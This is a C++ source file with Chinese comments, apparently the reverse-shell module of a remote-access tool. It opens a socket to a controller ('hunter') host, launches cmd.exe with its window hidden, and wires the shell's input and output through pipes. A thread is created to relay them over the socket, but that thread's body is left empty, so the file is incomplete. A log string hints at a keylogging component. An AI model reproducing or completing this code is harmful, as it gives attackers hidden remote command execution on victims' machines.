#include "pch.h"
#include "Shell.h"

static Shell gShell; // 初始化类
static TcpSocket gSock; // 传递数据的套接字
// 四个HANDLE 用来创建两个管道
static HANDLE ghReadPipe1, ghWritePipe1, ghReadPipe2, ghWritePipe2;
// 创建命令行进程之后拿到的pi 控制cmd进程
static PROCESS_INFORMATION gPi = { 0 };

Shell::~Shell() {

}

void Shell::startShell(std::string domain, int port) {
	// 新建连接到hunter端的socket连接
	if (!gSock.connectTo(domain, port)) {
		gSock.dissconnect();
		OutputDebugStringA("Failed to connect hunter for keybd\r\n");
		return;
	}
	// 启动cmd子进程
	if (!createCmd()) {
		OutputDebugStringA("create cmd process failed\r\n");
		gSock.dissconnect();
		return;
	}
	// 创建沟通管道和socket的线程函数
	HANDLE h = CreateThread(NULL, 0, Shell::threadProc, (LPVOID)NULL, 0, NULL);
	if (!h) {
		OutputDebugStringA("Failed to create new thread\r\n");
		gSock.dissconnect();
		CloseHandle(ghReadPipe1);
		CloseHandle(ghReadPipe2);
		CloseHandle(ghWritePipe1);
		CloseHandle(ghWritePipe2);
		CloseHandle(gPi.hThread);
		TerminateProcess(gPi.hProcess, 0); // 一定要关闭子进程啊！！！！！
		CloseHandle(gPi.hProcess);
		return;
	}
	OutputDebugStringA("start shell successfully\r\n");
}

// 启动cmd子进程
bool Shell::createCmd() {
	// 创建匿名管道
	SECURITY_ATTRIBUTES securityAttributes = { 0 };
	securityAttributes.bInheritHandle = TRUE;
	securityAttributes.nLength = sizeof(securityAttributes);
	securityAttributes.lpSecurityDescriptor = NULL;
	if ((!::CreatePipe(&ghReadPipe1, &ghWritePipe1, &securityAttributes, 0)) |
		(!::CreatePipe(&ghReadPipe2, &ghWritePipe2, &securityAttributes, 0))) {
		OutputDebugStringA("create pipe failde\r\n");
		return false;
	}

	// 因为会多次使用 所以要做好准备
	RtlZeroMemory(&gPi, sizeof(PROCESS_INFORMATION));
	// 创建cmd进程
	STARTUPINFOA si = { 0 };
	// 隐藏窗口
	si.dwFlags = STARTF_USESHOWWINDOW | STARTF_USESTDHANDLES;
	si.wShowWindow = SW_HIDE;
	// 标准输入输出和错误连接至管道
	si.hStdInput = ghReadPipe2;
	si.hStdOutput = si.hStdError = ghWritePipe1;
	// 拼接启动命令行的命令
	CHAR szCmdLine[256] = { 0 };
	GetSystemDirectoryA(szCmdLine, sizeof(szCmdLine));
	StringCchCatA(szCmdLine, _countof(szCmdLine), "\\cmd.exe");
	if (CreateProcessA(szCmdLine, NULL, NULL, NULL, TRUE, 0, NULL, NULL, &si, &gPi) == 0)
	{
		return false;
	}

	return true;
}

// 线程函数 负责沟通管道和socket
DWORD Shell::threadProc(LPVOID args) {

}
